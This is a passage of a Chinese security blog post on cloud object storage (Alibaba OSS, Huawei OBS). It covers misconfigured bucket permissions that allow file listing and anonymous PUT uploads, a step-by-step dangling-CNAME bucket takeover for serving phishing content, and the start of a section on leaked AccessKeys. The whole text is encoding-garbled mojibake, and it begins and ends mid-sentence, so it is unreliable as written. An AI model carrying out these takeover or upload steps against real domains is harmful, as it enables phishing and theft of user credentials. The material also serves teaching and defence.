åç§°å…¨ç½‘å”¯ä¸€ï¼‰ï¼›</p></li><li><p>åœ°åŸŸå…³è”æ€§ï¼šåˆ›å»ºæ—¶éœ€æŒ‡å®šåœ°åŸŸï¼ˆå¦‚ â€œåä¸œ 2ï¼ˆä¸Šæµ·ï¼‰â€ï¼‰ï¼Œæ•°æ®å­˜å‚¨åœ¨å¯¹åº”åœ°åŸŸçš„ç‰©ç†èŠ‚ç‚¹ï¼Œè®¿é—®æ—¶ä¼˜å…ˆé€‰æ‹©åŒåœ°åŸŸèµ„æºé™ä½å»¶è¿Ÿï¼›</p></li><li><p>æƒé™æ§åˆ¶å•å…ƒï¼šBucket çš„ ACLï¼ˆè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰ã€é˜²ç›—é“¾ã€ç”Ÿå‘½å‘¨æœŸè§„åˆ™ç­‰é…ç½®å‡ä½œç”¨äºæ•´ä¸ª Bucketã€‚</p></li></ul><h2 id="AWSä¸ºä¾‹"><a href="#AWSä¸ºä¾‹" class="headerlink" title="AWSä¸ºä¾‹"></a>AWSä¸ºä¾‹</h2><p>å„ä¸ªäº‘å‚å•†å¯¹äº‘æœåŠ¡çš„å«æ³•éƒ½ä¸ç»Ÿä¸€ï¼Œè¿™é‡Œç»Ÿä¸€ä»¥AWSä¸ºä¾‹ã€‚</p><p><strong>S3 å¯¹è±¡å­˜å‚¨Simple Storage Service</strong>ï¼Œç®€å•çš„è¯´å°±æ˜¯ä¸€ä¸ªç±»ä¼¼<strong>ç½‘ç›˜</strong>çš„ä¸œè¥¿</p><p><strong>EC2 å³å¼¹æ€§è®¡ç®—æœåŠ¡Elastic Compute Cloud</strong>ï¼Œç®€å•çš„è¯´å°±æ˜¯åœ¨äº‘ä¸Šçš„ä¸€å°<strong>è™šæ‹Ÿæœº</strong>ã€‚</p><p><strong>RDS äº‘æ•°æ®åº“Relational Database Service</strong>ï¼Œç®€å•çš„è¯´å°±æ˜¯äº‘ä¸Šçš„ä¸€ä¸ª<strong>æ•°æ®åº“</strong>ã€‚</p><p><strong>IAM èº«ä»½å’Œè®¿é—®ç®¡ç†Identity and Access Management</strong>ï¼Œç®€å•çš„è¯´å°±æ˜¯äº‘æ§åˆ¶å°ä¸Šçš„ä¸€å¥—<strong>èº«ä»½ç®¡ç†æœåŠ¡</strong>ï¼Œå¯ä»¥ç”¨æ¥ç®¡ç†æ¯ä¸ªå­è´¦å·çš„<strong>æƒé™</strong>ã€‚</p><h1 id="äº‘æœåŠ¡æ”»é˜²-å¯¹è±¡å­˜å‚¨å®‰å…¨"><a href="#äº‘æœåŠ¡æ”»é˜²-å¯¹è±¡å­˜å‚¨å®‰å…¨" class="headerlink" title="äº‘æœåŠ¡æ”»é˜²-å¯¹è±¡å­˜å‚¨å®‰å…¨"></a>äº‘æœåŠ¡æ”»é˜²-å¯¹è±¡å­˜å‚¨å®‰å…¨</h1><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>äº‘æœåŠ¡çš„å¯¹è±¡å­˜å‚¨æ˜¯ä¸€ç§ç”¨äºå­˜å‚¨å’Œç®¡ç†å¤§é‡éç»“æ„åŒ–æ•°æ®çš„æŠ€æœ¯ã€‚å®ƒå°†æ•°æ®åˆ†å‰²æˆå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡åŒ…å«æ•°æ®å’Œå…ƒæ•°æ®ã€‚å¯¹è±¡å­˜å‚¨å…·æœ‰é«˜å¯æ‰©å±•æ€§ã€é«˜å¯ç”¨æ€§å’Œè€ä¹…æ€§ç­‰ç‰¹ç‚¹ã€‚</p><p>å¯¹è±¡å­˜å‚¨çš„ä¸»è¦å¯¹è±¡æ˜¯æ–‡ä»¶ã€å›¾ç‰‡ã€è§†é¢‘ã€éŸ³é¢‘å’Œæ—¥å¿—ç­‰éç»“æ„åŒ–æ•°æ®ã€‚å®ƒé€‚ç”¨äºå„ç§åº”ç”¨åœºæ™¯ï¼Œå¦‚å¤‡ä»½å’Œæ¢å¤ã€å½’æ¡£æ•°æ®ã€å¤§æ•°æ®åˆ†æã€å†…å®¹å­˜å‚¨å’Œåˆ†å‘ç­‰ã€‚</p><p>äº‘æœåŠ¡çš„å¯¹è±¡å­˜å‚¨å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">é«˜å¯æ‰©å±•æ€§ï¼šå¯¹è±¡å­˜å‚¨å¯ä»¥å­˜å‚¨å¤§é‡æ•°æ®ï¼Œå¹¶æ”¯æŒæ°´å¹³æ‰©å±•ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚åŠ¨æ€å¢åŠ å­˜å‚¨å®¹é‡ã€‚</span><br><span class="line">é«˜å¯ç”¨æ€§ï¼šå¯¹è±¡å­˜å‚¨åœ¨å¤šä¸ªèŠ‚ç‚¹ä¸Šè¿›è¡Œæ•°æ®å¤åˆ¶ï¼Œä»¥æä¾›æ•°æ®å†—ä½™å’Œå®¹é”™èƒ½åŠ›ï¼Œç¡®ä¿æ•°æ®çš„é«˜å¯ç”¨æ€§ã€‚</span><br><span class="line">è€ä¹…æ€§ï¼šå¯¹è±¡å­˜å‚¨é€šè¿‡æ•°æ®å†—ä½™å’Œçº åˆ ç ç­‰æŠ€æœ¯æ¥ä¿æŠ¤æ•°æ®å…å—ç¡¬ä»¶æ•…éšœå’Œæ•°æ®ä¸¢å¤±çš„å½±å“ï¼Œæä¾›æ•°æ®çš„æŒä¹…æ€§å­˜å‚¨ã€‚</span><br><span class="line">ä½æˆæœ¬ï¼šå¯¹è±¡å­˜å‚¨é€šå¸¸é‡‡ç”¨åˆ†å¸ƒå¼æ¶æ„ï¼Œå¯ä»¥åœ¨ä½æ€§èƒ½ç¡¬ä»¶ä¸Šè¿è¡Œï¼Œä»è€Œé™ä½äº†æˆæœ¬ã€‚</span><br><span class="line">é«˜æ€§èƒ½ï¼šå¯¹è±¡å­˜å‚¨æä¾›äº†é«˜åº¦å¯å®šåˆ¶çš„æ•°æ®è¯»å†™æ¥å£å’Œé«˜é€Ÿç½‘ç»œä¼ è¾“ï¼Œå¯ä»¥å®ç°å¿«é€Ÿçš„æ•°æ®å­˜å–ã€‚</span><br><span class="line">äº‘æœåŠ¡çš„å¯¹è±¡å­˜å‚¨åœ¨å„ä¸ªäº‘æœåŠ¡æä¾›å•†ä¸­å¾—åˆ°äº†å¹¿æ³›åº”ç”¨ï¼Œå¦‚Amazon S3ã€Microsoft Azure Blob Storageã€Google Cloud Storageç­‰ã€‚å®ƒä»¬æä¾›äº†å¯é ã€å®‰å…¨ã€ç»æµé«˜æ•ˆçš„å­˜å‚¨æœåŠ¡ï¼Œä¸ºç”¨æˆ·æä¾›äº†é«˜åº¦æ‰©å±•çš„äº‘å­˜å‚¨è§£å†³æ–¹æ¡ˆã€‚</span><br></pre></td></tr></table></figure><h2 id="Bucket"><a href="#Bucket" class="headerlink" title="Bucket"></a>Bucket</h2><p>åœ¨å¯¹è±¡å­˜å‚¨ä¸­ï¼ŒBucketï¼ˆå­˜å‚¨æ¡¶ï¼‰æ˜¯ç”¨äºç»„ç»‡å’Œç®¡ç†å¯¹è±¡çš„åŸºæœ¬å®¹å™¨ã€‚ä¸€ä¸ªBucketå¯ä»¥å®¹çº³ä»»æ„æ•°é‡çš„å¯¹è±¡ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªå”¯ä¸€çš„åç§°æ¥è¿›è¡Œæ ‡è¯†ã€‚Bucketåç§°åœ¨æ•´ä¸ªå­˜å‚¨ç³»ç»Ÿä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚å¯ä»¥å°†Bucketè§†ä¸ºä¸€ä¸ªæ–‡ä»¶å¤¹æˆ–å®¹å™¨ï¼Œç”¨äºå­˜å‚¨ç›¸å…³å¯¹è±¡ã€‚</p><p>Bucketå…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š</p><p>å‘½åç©ºé—´å”¯ä¸€æ€§ï¼šæ¯ä¸ªBucketçš„åç§°åœ¨æ•´ä¸ªå­˜å‚¨ç³»ç»Ÿä¸­å¿…é¡»å”¯ä¸€ã€‚</p><p>å­˜å‚¨ç­–ç•¥ï¼šBucketå¯ä»¥è®¾ç½®ä¸åŒçš„å­˜å‚¨ç­–ç•¥ï¼Œä¾‹å¦‚æ•°æ®å†—ä½™å¤‡ä»½ç­–ç•¥ã€æ•°æ®ä¿ç•™æ—¶é—´ç­‰ã€‚</p><p>è®¿é—®æ§åˆ¶ï¼šBucketå¯ä»¥è®¾ç½®è®¿é—®æƒé™ï¼Œæ§åˆ¶å“ªäº›ç”¨æˆ·æˆ–å®ä½“å¯ä»¥è®¿é—®Bucketä¸­çš„å¯¹è±¡ã€‚</p><p>é›†åˆå¯¹è±¡ï¼šBucketä¸­å¯ä»¥å®¹çº³å¤šä¸ªå¯¹è±¡ï¼Œæ¯ä¸ªå¯¹è±¡éƒ½æœ‰å”¯ä¸€çš„Keyæ¥æ ‡è¯†ã€‚</p><p>å…ƒæ•°æ®ï¼šBucketå¯ä»¥å­˜å‚¨ä¸€äº›ä¸å¯¹è±¡ç›¸å…³çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œä¾‹å¦‚æ–‡ä»¶å¤§å°ã€åˆ›å»ºæ—¶é—´å’Œä¿®æ”¹æ—¶é—´ç­‰ã€‚</p><p>å¯¹è±¡å­˜å‚¨ä¸­çš„Bucketæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æ¦‚å¿µï¼Œå®ƒæä¾›äº†å¯¹å­˜å‚¨ç³»ç»Ÿä¸­å¯¹è±¡çš„ç»„ç»‡å’Œç®¡ç†èƒ½åŠ›ã€‚ä½¿ç”¨Bucketå¯ä»¥æ–¹ä¾¿åœ°å°†ç›¸å…³çš„å¯¹è±¡è¿›è¡Œåˆ†ç»„ï¼Œå¹¶å¯¹å…¶è®¾ç½®é€‚å½“çš„è®¿é—®æƒé™å’Œå­˜å‚¨ç­–ç•¥ã€‚</p><h2 id="å¼€é€šé˜¿é‡Œäº‘OSS"><a href="#å¼€é€šé˜¿é‡Œäº‘OSS" class="headerlink" title="å¼€é€šé˜¿é‡Œäº‘OSS"></a>å¼€é€šé˜¿é‡Œäº‘OSS</h2><p>æœ¬æ–‡ä»¥é˜¿é‡Œäº‘OSSä¸¾ä¾‹ï¼Œç™»å½•é˜¿é‡Œäº‘å®˜ç½‘ï¼Œæ‰¾åˆ°â€œå¯¹è±¡å­˜å‚¨â€</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914013318886.png" alt="image-20250914013318886"></p><h2 id="åˆ›å»ºBucket"><a href="#åˆ›å»ºBucket" class="headerlink" title="åˆ›å»ºBucket"></a>åˆ›å»ºBucket</h2><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914013500321.png" alt="image-20250914013500321"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914013702181.png" alt="image-20250914013702181"></p><h2 id="å®‰å…¨é—®é¢˜"><a href="#å®‰å…¨é—®é¢˜" class="headerlink" title="å®‰å…¨é—®é¢˜"></a>å®‰å…¨é—®é¢˜</h2><h3 id="æƒé™é…ç½®ä¸å½“"><a href="#æƒé™é…ç½®ä¸å½“" class="headerlink" title="æƒé™é…ç½®ä¸å½“"></a>æƒé™é…ç½®ä¸å½“</h3><p>Bucket ACLï¼ˆAccess Control Listï¼‰æ˜¯æ§åˆ¶ Bucket è®¿é—®æƒé™çš„æ ¸å¿ƒé…ç½®ï¼Œä¸»æµäº‘å‚å•†å‡æ”¯æŒä»¥ä¸‹ 3 ç§åŸºç¡€æƒé™ï¼Œé£é™©ç­‰çº§ä»ä½åˆ°é«˜é€’å¢ï¼š</p><table><thead><tr><th>æƒé™ç±»å‹</th><th>æ ¸å¿ƒæƒé™èŒƒå›´</th><th>å®‰å…¨é£é™©</th></tr></thead><tbody><tr><td>ç§æœ‰</td><td>ä»… Bucket æ‰€æœ‰è€…åŠè¢«æˆæƒçš„å­è´¦æˆ·å¯è¯»å†™å¯¹è±¡ï¼ŒåŒ¿åç”¨æˆ·æ— ä»»ä½•æƒé™</td><td>é£é™©æœ€ä½ï¼Œç¬¦åˆæœ€å°æƒé™åŸåˆ™ï¼Œæ¨èé»˜è®¤é…ç½®</td></tr><tr><td>å…¬å…±è¯»</td><td>ä»»ä½•äººï¼ˆå«åŒ¿åç”¨æˆ·ï¼‰å¯è¯»å– Bucket å†…å¯¹è±¡ï¼ˆå¦‚ä¸‹è½½å›¾ç‰‡ã€æŸ¥çœ‹æ—¥å¿—ï¼‰ï¼Œä½†ä»…æ‰€æœ‰è€…å¯å†™å…¥</td><td>é£é™©ä¸­ç­‰ï¼šè‹¥å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ç”¨æˆ·ä¿¡æ¯ã€æœªå…¬å¼€æ–‡æ¡£ï¼‰ï¼Œå¯èƒ½å¯¼è‡´æ•°æ®æ³„éœ²ï¼›è‹¥é…ç½®<code>ListObject</code>æ“ä½œï¼Œä¼šæ³„éœ² Bucket å†…æ‰€æœ‰å¯¹è±¡çš„ç›®å½•ç»“æ„ï¼ˆå³ â€œç›®å½•éå†æ¼æ´â€ï¼‰</td></tr><tr><td>å…¬å…±è¯»å†™</td><td>ä»»ä½•äººï¼ˆå«åŒ¿åç”¨æˆ·ï¼‰å¯è¯»å†™å¯¹è±¡ï¼ˆå¦‚ä¸Šä¼ æ¶æ„æ–‡ä»¶ã€åˆ é™¤åˆæ³•æ•°æ®ï¼‰</td><td>é£é™©æé«˜ï¼šæ”»å‡»è€…å¯é€šè¿‡ HTTP PUT æ–¹æ³•ä¸Šä¼ æ¶æ„è„šæœ¬ï¼ˆå¦‚.phpã€.jspï¼‰ï¼Œè‹¥ Bucket ç»‘å®šåŸŸåå¹¶å¼€å¯è§£æï¼Œå¯èƒ½è§¦å‘è„šæœ¬æ‰§è¡Œï¼ˆå¦‚ â€œæ¶æ„æ–‡ä»¶ä¸Šä¼  + è§£æâ€ æ¼æ´ï¼‰ï¼›è¿˜å¯èƒ½å¯¼è‡´æ•°æ®è¢«ç¯¡æ”¹æˆ–åˆ é™¤</td></tr></tbody></table><h4 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h4><p>ä¸Šå›¾å¯è§åˆ›å»ºçš„æ—¶å€™å°±æ˜¯é»˜è®¤ç»„ç»‡å…¬å…±è®¿é—®ï¼Œè¯»å†™æƒé™ä¹Ÿæ˜¯ç§æœ‰ï¼Œåˆ›å»ºä¹‹åè¿›è¡Œä¿®æ”¹ä¼šé€ æˆå®‰å…¨é—®é¢˜</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914022741567.png" alt="image-20250914022741567"></p><p>å¼€å¯æ—¶</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023046560.png" alt="image-20250914023046560"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914022838989.png" alt="image-20250914022838989"></p><p>å¼€å¯ä¹‹åï¼Œåé¢è¯»å†™æƒé™æ˜¯æ”¹å˜ä¸äº†çš„ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914022919551.png" alt="image-20250914022919551"></p><p>å½“ä¿®æ”¹é…ç½®ä¹‹å</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023252942.png" alt="image-20250914023252942"></p><p>å‘ç”Ÿæ”¹å˜ã€‚æ­¤æ—¶ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023322355.png" alt="image-20250914023322355"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023410813.png" alt="image-20250914023410813"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023431306.png" alt="image-20250914023431306"></p><p>è¿™å°±é€ æˆäº†æ–‡ä»¶éå†ã€‚</p><h4 id="fofaæŒ‡çº¹"><a href="#fofaæŒ‡çº¹" class="headerlink" title="fofaæŒ‡çº¹"></a>fofaæŒ‡çº¹</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914115820550.png" alt="image-20250914115820550"></p><h4 id="ä¸Šä¼ æ–‡ä»¶"><a href="#ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶"></a>ä¸Šä¼ æ–‡ä»¶</h4><p>å¼€å¯è¯»å†™æƒé™ä¹‹å</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914023924693.png" alt="image-20250914023924693"></p><p>è·å–getæ•°æ®é›†æ¢æˆputè¯·æ±‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914024139857.png" alt="image-20250914024139857"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914024242111.png" alt="image-20250914024242111"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914024253885.png" alt="image-20250914024253885"></p><h3 id="åŸŸåè§£ææ¥ç®¡"><a href="#åŸŸåè§£ææ¥ç®¡" class="headerlink" title="åŸŸåè§£ææ¥ç®¡"></a>åŸŸåè§£ææ¥ç®¡</h3><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/20250914024543928.png" alt="image.png"></p><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h4><p>å½“ç”¨æˆ·ä¸º Bucket ç»‘å®šè‡ªå®šä¹‰åŸŸåï¼ˆå¦‚<code>static.test.com</code>ï¼‰æ—¶ï¼Œä¼šåœ¨ DNS æœåŠ¡å•†ï¼ˆå¦‚é˜¿é‡Œäº‘ DNSã€è…¾è®¯äº‘ DNSï¼‰é…ç½®ä¸€æ¡ CNAME è®°å½•ï¼Œå°†åŸŸåæŒ‡å‘ Bucket çš„å®˜æ–¹åŸŸåï¼ˆå¦‚<code>test.oss-cn-shanghai.aliyuncs.com</code>ï¼‰ã€‚è‹¥ç”¨æˆ·åˆ é™¤ Bucket åæœªåˆ é™¤ DNS çš„ CNAME è®°å½•ï¼Œè¯¥åŸŸåä¼šæŒç»­æŒ‡å‘å·²ä¸å­˜åœ¨çš„ Bucketï¼ˆè¿”å›<code>NoSuchBucket</code>é”™è¯¯ï¼‰ï¼Œæ”»å‡»è€…å¯é€šè¿‡ â€œåˆ›å»ºåŒå Bucketâ€ æ¥ç®¡è¯¥åŸŸåçš„è§£ææƒã€‚</p><h4 id="æ¼æ´åˆ¤æ–­ä¸åˆ©ç”¨æ­¥éª¤"><a href="#æ¼æ´åˆ¤æ–­ä¸åˆ©ç”¨æ­¥éª¤" class="headerlink" title="æ¼æ´åˆ¤æ–­ä¸åˆ©ç”¨æ­¥éª¤"></a>æ¼æ´åˆ¤æ–­ä¸åˆ©ç”¨æ­¥éª¤</h4><ol><li><strong>æ¼æ´åˆ¤æ–­</strong>ï¼š</li></ol><ul><li><p>è®¿é—®ç»‘å®šåŸŸåï¼ˆå¦‚<code>https://static.test.com</code>ï¼‰ï¼Œè‹¥é¡µé¢è¿”å›<code>NoSuchBucket</code>é”™è¯¯ï¼ˆè¡¨ç¤º Bucket ä¸å­˜åœ¨ï¼‰ï¼› </p></li><li><p>é€šè¿‡<code>nslookup</code>æˆ–<code>dig</code>å‘½ä»¤æŸ¥çœ‹åŸŸå CNAME è®°å½•ï¼ˆå¦‚<code>nslookup static.test.com</code>ï¼‰ï¼Œè‹¥è¿”å›äº‘å‚å•† Bucket åŸŸåï¼ˆå¦‚<code>*.oss-cn-shanghai.aliyuncs.com</code>ï¼‰ï¼Œåˆ™ç¡®è®¤å¯æ¥ç®¡ï¼› </p></li><li><p>è‹¥è®¿é—®è¿”å›<code>AccessDenied</code>ï¼ˆè¡¨ç¤º Bucket å­˜åœ¨ä½†æ— è®¿é—®æƒé™ï¼‰ï¼Œåˆ™æ— æ³•æ¥ç®¡ã€‚</p></li></ul><h4 id="å®æˆ˜åˆ©ç”¨ï¼ˆä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼‰ï¼š"><a href="#å®æˆ˜åˆ©ç”¨ï¼ˆä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼‰ï¼š" class="headerlink" title="å®æˆ˜åˆ©ç”¨ï¼ˆä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼‰ï¼š"></a><strong>å®æˆ˜åˆ©ç”¨ï¼ˆä»¥é˜¿é‡Œäº‘ä¸ºä¾‹ï¼‰</strong>ï¼š</h4><ul><li><p>æ­¥éª¤ 1ï¼šåœ¨é˜¿é‡Œäº‘ OSS æ§åˆ¶å°åˆ›å»ºä¸åŸ Bucket åŒåçš„ Bucketï¼ˆå¦‚åŸ Bucket åä¸º<code>test</code>ï¼Œåˆ™åˆ›å»º<code>test</code>ï¼Œåœ°åŸŸéœ€ä¸åŸ Bucket ä¸€è‡´ï¼Œå¦åˆ™ CNAME è§£æå¯èƒ½å¤±è´¥ï¼‰ï¼› </p></li><li><p>æ­¥éª¤ 2ï¼šåœ¨æ–°åˆ›å»ºçš„ Bucket ä¸­ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼ˆå¦‚é’“é±¼é¡µé¢ã€æ¶æ„è„šæœ¬ï¼‰ï¼›</p></li><li><p>æ­¥éª¤ 3ï¼šç”¨æˆ·è®¿é—®<code>https://static.test.com</code>æ—¶ï¼Œä¼šè‡ªåŠ¨è§£æåˆ°æ”»å‡»è€…åˆ›å»ºçš„ Bucketï¼ŒåŠ è½½æ¶æ„å†…å®¹ï¼› </p></li><li><p>é£é™©æ¡ˆä¾‹ï¼šè‹¥åŸåŸŸåæ˜¯ä¼ä¸šçš„ â€œå®˜ç½‘ä¸‹è½½åœ°å€â€ æˆ– â€œç”¨æˆ·ç™»å½•è·³è½¬åœ°å€â€ï¼Œæ¥ç®¡åå¯åˆ†å‘é’“é±¼è½¯ä»¶ã€çªƒå–ç”¨æˆ·è´¦å·å¯†ç ã€‚</p></li></ul><h4 id="åä¸ºäº‘OBSæµ‹è¯•ï¼ˆæˆåŠŸå¤ç°ï¼‰"><a href="#åä¸ºäº‘OBSæµ‹è¯•ï¼ˆæˆåŠŸå¤ç°ï¼‰" class="headerlink" title="åä¸ºäº‘OBSæµ‹è¯•ï¼ˆæˆåŠŸå¤ç°ï¼‰"></a>åä¸ºäº‘OBSæµ‹è¯•ï¼ˆæˆåŠŸå¤ç°ï¼‰</h4><p>ä½¿ç”¨ä¸€è´¦æˆ·åˆ›å»ºå­˜å‚¨æ¡¶ç»‘å®šåŸŸååï¼Œå†åˆ é™¤å­˜å‚¨æ¡¶ï¼ˆè¿™é‡Œç¼ºå‡ å¼ æˆªå›¾ï¼Œä¸è¡¥äº†ï¼Œå¸ˆå‚…å¯è‡ªè¡Œæµ‹è¯•ï¼‰</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/586ebe8b4ad04390b52016aeb6bfa718.png" alt="img"></p><p>å†æ¬¡è®¿é—®è¯¥åŸŸåæ˜¾ç¤ºâ€œNoSuchBucketâ€</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/eb855a23f29b40679bde7eefacf60bdb.png" alt="img"></p><p>ä½¿ç”¨nslookupæ”¶é›†å—å®³è€…ä¿¡æ¯</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/06e1b5ad213742de9e9de25c3dd24e53.png" alt="img"></p><p>æŸ¥è¯¢ä¸Šå›¾IPåœ°ç†ä½ç½®ï¼Œå³åˆ›å»ºå­˜å‚¨æ¡¶é€‰æ‹©çš„åœ°åŸŸ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/0afeeb156d584e2c823b0b8bf4c6431d.png" alt="img"></p><p>ä½¿ç”¨å¦ä¸€åä¸ºè´¦æˆ·æ¨¡æ‹Ÿæ”»å‡»è€…è´¦æˆ·ï¼Œæ ¹æ®å—å®³è€…ä¿¡æ¯ä»¿é€ å­˜å‚¨æ¡¶</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/116885944091420a9f3a64618203ec05.png" alt="img"></p><p>é…ç½®åŸŸåè§£æï¼Œç»‘å®šå—å®³è€…åŸŸå</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/37936a6924154344b3d1ab0352ad4b83.png" alt="img"></p><p>å†æ¬¡è®¿é—®è¯¥åŸŸåï¼ŒæˆåŠŸæ¥ç®¡å—å®³è€…è‡ªå®šä¹‰åŸŸåå­˜å‚¨æ¡¶ï¼</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/52dd37cc9c7a4af7aa17c90dd71f9f0c.png" alt="img"></p><p>æˆåŠŸè§£ææ”»å‡»è€…ä¸Šä¼ çš„é™æ€èµ„æº</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/b0d77bfbe11f41028430026bbbf58d73.png" alt="img"></p><h4 id="fofaæŒ‡çº¹-1"><a href="#fofaæŒ‡çº¹-1" class="headerlink" title="fofaæŒ‡çº¹"></a>fofaæŒ‡çº¹</h4><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914115208388.png" alt="image-20250914115208388"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914115226225.png" alt="image-20250914115226225"></p><h3 id="AccessKeyæ³„éœ²"><a href="#AccessKeyæ³„éœ²" class="headerlink" title="AccessKeyæ³„éœ²"></a>AccessKeyæ³„éœ²</h3><h4 id="ä»€ä¹ˆæ˜¯-AccessKeyï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯-AccessKeyï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ AccessKeyï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ AccessKeyï¼Ÿ</h4><p>é€šå¸¸åŒ…æ‹¬ä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AccessKeyID(AKID)ï¼šç”¨äºæ ‡è¯†ç”¨æˆ·èº«ä»½ã€‚</span><br><span class="line">AccessKeySecret(AKSecret)ï¼šç”¨äºéªŒè¯èº«ä»½ï¼Œç±»ä¼¼å¯†ç ã€‚</span><br></pre></td></tr></table></figure><p>å®ƒä»¬ç”¨äºç”¨æˆ·é€šè¿‡ç¼–ç¨‹æ¥å£ï¼ˆAPI&#x2F;SDKï¼‰è®¿é—®äº‘æœåŠ¡æ—¶çš„èº«ä»½è®¤è¯ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/8cb9754911a547a1a596719751ca52df.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/fd980d1364724947abd0c0876c4e996a.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/3b5b08a1804e4dae8b03206a34df0e05.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250914025948812.png" alt="image-20250914025948812"></p><h4 id="AccessKey-ä½œç”¨ä¸æ³„éœ²åœºæ™¯"><a href="#AccessKey-ä½œç”¨ä¸æ³„éœ²åœºæ™¯" class="headerlink" title="AccessKey ä½œç”¨ä¸æ³„éœ²åœºæ™¯"></a>AccessKey ä½œç”¨ä¸æ³„éœ²åœºæ™¯</h4><p>AccessKeyï¼ˆç”± AccessKeyID å’Œ AccessKeySecret ç»„æˆï¼‰æ˜¯äº‘æœåŠ¡ API è°ƒç”¨çš„æ ¸å¿ƒå‡­è¯ï¼Œæ‹¥æœ‰è¯¥å‡­è¯çš„ç”¨æˆ·å¯é€šè¿‡ API æˆ–å·¥å…·ï¼ˆå¦‚ OSS Browserã€äº‘å‚å•† CLIï¼‰æ“ä½œå¯¹åº”çš„äº‘èµ„æºï¼ˆå¦‚ä¸Šä¼  &#x2F; åˆ é™¤ OSS æ–‡ä»¶ã€åˆ›å»º ECS å®ä¾‹ï¼‰ã€‚<br><strong>å¸¸è§æ³„éœ²åœºæ™¯</strong>ï¼š</p><p>1.æºä»£ç å­˜å‚¨åº“ï¼šå¦‚æœæ‚¨çš„æºä»£ç å­˜å‚¨åº“ï¼ˆå¦‚GitHubæˆ–Bitbucketï¼‰å…¬å¼€äº†æ‚¨çš„ä»£ç ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«äº†äº‘æœåŠ¡access keyï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŸ¥çœ‹ä»£ç è·å–è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/d73a3d63df4842cf9645f1f2a08fba8e.png" alt="img"></p><p>2.æ—¥å¿—æ–‡ä»¶ï¼šå¦‚æœæ‚¨å°†äº‘æœåŠ¡access 